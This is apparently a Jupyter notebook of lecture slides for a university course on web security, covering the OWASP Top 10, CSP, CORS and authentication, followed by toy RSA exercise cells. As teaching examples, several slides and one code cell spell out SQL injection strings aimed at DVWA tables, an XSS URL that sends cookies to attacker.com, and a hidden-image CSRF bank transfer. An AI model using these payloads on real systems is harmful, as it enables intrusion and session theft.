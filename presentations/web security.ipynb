{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "f1270404",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "# CMP 5006 - Information Security \n",
    "\n",
    "\n",
    "## Web Security\n",
    "\n",
    "\n",
    "### Alejandro Proano, PhD. "
   ]
  },
  {
   "cell_type": "markdown",
   "id": "e38a58e2",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "## Introduction to Web Security\n",
    "\n",
    "- Web security protects websites, web applications, and web services\n",
    "- Crucial as business and personal activities shift online\n",
    "- Involves protecting both client-side and server-side components\n",
    "- Evolving threat landscape requires continuous learning\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "f262d9b0",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "## Web Security Landscape\n",
    "\n",
    "- In 2022, web application attacks increased by 251% (Source: Akamai)\n",
    "- Average cost of a data breach: $4.35 million (IBM Cost of a Data Breach Report 2022)\n",
    "- 50% of all data breaches involved web applications\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "3b41b8f2",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "## Real-world Application: 2017 Equifax Breach\n",
    "\n",
    "- Vulnerability: Unpatched Apache Struts framework (CVE-2017-5638)\n",
    "- Impact: 147 million people's personal data exposed\n",
    "- Cost: $700 million settlement\n",
    "- Lesson: Patch management is critical\n",
    "\n",
    "Reference: [FTC Equifax Data Breach Settlement](https://www.ftc.gov/enforcement/refunds/equifax-data-breach-settlement)\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "b09b01d8",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "## Real-world Application: GitHub's CSP Journey\n",
    "\n",
    "- Incrementally deployed CSP to protect against XSS\n",
    "- Used report-only mode first to identify legitimate use cases\n",
    "- Iteratively strengthened policy while maintaining functionality\n",
    "\n",
    "Reference: [GitHub's CSP Journey](https://github.blog/2017-01-19-github-security-update-content-security-policy/)\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "a8c7a2ae",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "## Common Web Vulnerabilities: OWASP Top 10\n",
    "\n",
    "1. Injection\n",
    "2. Broken Authentication\n",
    "3. Sensitive Data Exposure\n",
    "4. XML External Entities (XXE)\n",
    "5. Broken Access Control\n",
    "6. Security Misconfigurations\n",
    "7. Cross-Site Scripting (XSS)\n",
    "8. Insecure Deserialization\n",
    "9. Using Components with Known Vulnerabilities\n",
    "10. Insufficient Logging & Monitoring\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ead867d5",
   "metadata": {},
   "outputs": [],
   "source": [
    "user = input()\n",
    "\"SELECT * FROM users WHERE username = '{}'\".format(user)\n",
    "\n",
    "\n",
    "--------\n",
    "user = \"admin\"\n",
    "\"SELECT * FROM users WHERE username = 'admin'\"\n",
    "\n",
    "user = \"admin' OR 1=1--\"\n",
    "\"\"\"\n",
    "SELECT first_name, surname \n",
    "FROM users\n",
    "WHERE username = 'admin' OR 1=1\n",
    "UNION SELECT information_schema.table_name \n",
    "FROM information_schema.tables--'\n",
    "\"\"\"\n",
    "\n",
    "admin' OR 1=1 UNION SELECT COLUMN_NAME, table_name FROM information_schema.COLUMNS WHERE table_schema='dvwa'#\n",
    "\n",
    "admin' OR 1=1 UNION SELECT name, comment FROM guestbook#\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "4afa7036",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "## Injection Vulnerabilities\n",
    "\n",
    "- SQL, NoSQL, OS, and LDAP injection\n",
    "- Occurs when untrusted data is sent as part of a command or query\n",
    "- Example SQL injection:\n",
    "\n",
    "```sql\n",
    "-- Vulnerable code\n",
    "query = \"SELECT * FROM users WHERE username = '\" + username + \"' AND password = '\" + password + \"'\";\n",
    "\n",
    "-- Attack input\n",
    "username: admin' --\n",
    "password: anything\n",
    "```\n",
    "\n",
    "- Result: Authentication bypass\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "bcd02920",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "## Cross-Site Scripting (XSS)\n",
    "\n",
    "- Occurs when applications include untrusted data in web pages\n",
    "- Three main types:\n",
    "  - Reflected XSS\n",
    "  - Stored XSS\n",
    "  - DOM-based XSS\n",
    "- Allows attackers to execute scripts in victims' browsers\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "9b876304",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "## XSS Example\n",
    "\n",
    "```html\n",
    "<!-- Vulnerable code -->\n",
    "<div>Welcome, <?php echo $_GET['name']; ?>!</div>\n",
    "\n",
    "<!-- Attack URL -->\n",
    "https://example.com/welcome.php?name=<script>document.location='https://attacker.com/steal.php?cookie='+document.cookie</script>\n",
    "```\n",
    "\n",
    "- Impact: Cookie theft, session hijacking, phishing\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "aa54d419",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "## Cross-Site Request Forgery (CSRF)\n",
    "\n",
    "- Forces authenticated users to execute unwanted actions\n",
    "- Leverages the fact that browsers send cookies with every request\n",
    "\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "94715d17",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "## CSRF Example\n",
    "\n",
    "```html\n",
    "<!-- Malicious website content -->\n",
    "<img src=\"https://bank.com/transfer?to=attacker&amount=1000\" style=\"display:none\" />\n",
    "```\n",
    "\n",
    "When a logged-in victim visits the malicious site, their browser makes the request with their authentication cookies.\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "a89d4496",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "## Content Security Policy (CSP)\n",
    "\n",
    "- Security layer that helps detect and mitigate certain attacks\n",
    "- Controls the resources the browser is allowed to load\n",
    "- Implemented via HTTP header or meta tag\n",
    "\n",
    "```http\n",
    "Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted-cdn.com;\n",
    "```\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "492ade43",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "## Same-Origin Policy and CORS\n",
    "\n",
    "- Same-Origin Policy (SOP): Security mechanism restricting how documents/scripts interact\n",
    "- Cross-Origin Resource Sharing (CORS): Controlled relaxation of SOP\n",
    "\n",
    "```http\n",
    "Access-Control-Allow-Origin: https://trusted-domain.com\n",
    "Access-Control-Allow-Methods: GET, POST\n",
    "Access-Control-Allow-Headers: X-Custom-Header\n",
    "```\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "90d5ab29",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "## Authentication Best Practices\n",
    "\n",
    "1. Multi-factor authentication\n",
    "2. Password policies \n",
    "3. Secure session management\n",
    "4. Account lockout policies\n",
    "5. Secure password storage (bcrypt, Argon2)\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "8c131c76",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "## HTTPS and TLS\n",
    "\n",
    "- HTTPS = HTTP over TLS (Transport Layer Security)\n",
    "- Provides:\n",
    "  - Authentication\n",
    "  - Data integrity\n",
    "  - Confidentiality\n",
    "\n",
    "\n",
    "$\\text{HTTPS Security} = \\min(\\text{Certificate strength}, \\text{Cipher strength}, \\text{Key exchange strength})$\n",
    "\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "5d343a17",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "## Web Application Firewalls (WAF)\n",
    "\n",
    "- Filter, monitor, and block HTTP traffic\n",
    "- Protect against attacks like XSS, CSRF, SQLi\n",
    "- Can use signature-based, anomaly-based, or reputation-based detection\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "040c2805",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "## Modern Authentication Frameworks\n",
    "\n",
    "- OAuth 2.0\n",
    "- OpenID Connect\n",
    "- FIDO2/WebAuthn\n",
    "- Time-based complexity for WebAuthn registration\n",
    "\n",
    "Reference: [FIDO Alliance](https://fidoalliance.org/specifications/)\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "c24520e2",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "## Security Testing Tools\n",
    "\n",
    "1. Dynamic Application Security Testing (DAST)\n",
    "   - OWASP ZAP\n",
    "   - Burp Suite\n",
    "2. Static Application Security Testing (SAST)\n",
    "   - SonarQube\n",
    "   - GitHub CodeQL\n",
    "3. Interactive Application Security Testing (IAST)\n",
    "   - Contrast Security\n",
    "   - Checkmarx\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "45fb9053",
   "metadata": {},
   "outputs": [],
   "source": [
    "p = 1234567\n",
    "n = 173*61"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "id": "a32100a1",
   "metadata": {},
   "outputs": [],
   "source": [
    "pr = 73\n",
    "pb = 3817\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "id": "980a5fa0",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "10553"
      ]
     },
     "execution_count": 24,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 27,
   "id": "981fa7a0",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "6563\n"
     ]
    }
   ],
   "source": [
    "c = pow(p, pr, n)\n",
    "print(c)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 28,
   "id": "205c66e3",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "10419\n"
     ]
    }
   ],
   "source": [
    "print(pow(c, pb, n))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 30,
   "id": "1eae117b",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "10419"
      ]
     },
     "execution_count": 30,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "c**pb % n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 31,
   "id": "3e72b68c",
   "metadata": {},
   "outputs": [],
   "source": [
    "def gcd(a, b):\n",
    "    while b:\n",
    "        a, b = b, a % b\n",
    "    return a\n",
    "\n",
    "def mod_inverse(e, phi):\n",
    "    def egcd(a, b):\n",
    "        if a == 0:\n",
    "            return (b, 0, 1)\n",
    "        else:\n",
    "            g, y, x = egcd(b % a, a)\n",
    "            return (g, x - (b // a) * y, y)\n",
    "    \n",
    "    g, x, _ = egcd(e, phi)\n",
    "    if g != 1:\n",
    "        raise Exception('Modular inverse does not exist')\n",
    "    else:\n",
    "        return x % phi"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 36,
   "id": "95492fdd",
   "metadata": {},
   "outputs": [],
   "source": [
    "def generate_keypair(p, q, e):\n",
    "    # Calculate n and phi\n",
    "    n = p * q\n",
    "    phi = (p-1) * (q-1)\n",
    "        \n",
    "    # Calculate d\n",
    "    d = mod_inverse(e, phi)\n",
    "    \n",
    "    return ((n, e), (n, d))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 67,
   "id": "5db44385",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "((10553, 107), (10553, 7523))"
      ]
     },
     "execution_count": 67,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "generate_keypair(173, 61, 107)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 38,
   "id": "e9b1cc20",
   "metadata": {},
   "outputs": [],
   "source": [
    "def encrypt(pk, plaintext):\n",
    "    n, e = pk\n",
    "    cipher = pow(plaintext, e, n)\n",
    "    return cipher\n",
    "\n",
    "def decrypt(pk, ciphertext):\n",
    "    n, d = pk\n",
    "    plain = pow(ciphertext, d, n)\n",
    "    return plain"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 50,
   "id": "473b267e",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Original Message: 1234\n",
      "Encrypted Message: 10540\n",
      "Decrypted Message: 1234\n"
     ]
    }
   ],
   "source": [
    "# Example usage\n",
    "\n",
    "public_key, private_key = generate_keypair(173, 61, 71)\n",
    "\n",
    "message = 1234\n",
    "\n",
    "print(\"Original Message:\", message)\n",
    "\n",
    "ciphertext = encrypt(public_key, message)\n",
    "print(\"Encrypted Message:\", ciphertext)\n",
    "\n",
    "decrypted_message = decrypt(private_key, ciphertext)\n",
    "print(\"Decrypted Message:\", decrypted_message)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 56,
   "id": "ff062cf2",
   "metadata": {},
   "outputs": [],
   "source": [
    "import numpy as np"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 65,
   "id": "73926183",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "4.700439718141092"
      ]
     },
     "execution_count": 65,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "np.log2(26)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 66,
   "id": "be9801e8",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "-5.700439718141092"
      ]
     },
     "execution_count": 66,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "np.log2(1/52)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "02daada4",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "celltoolbar": "Slideshow",
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.12.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
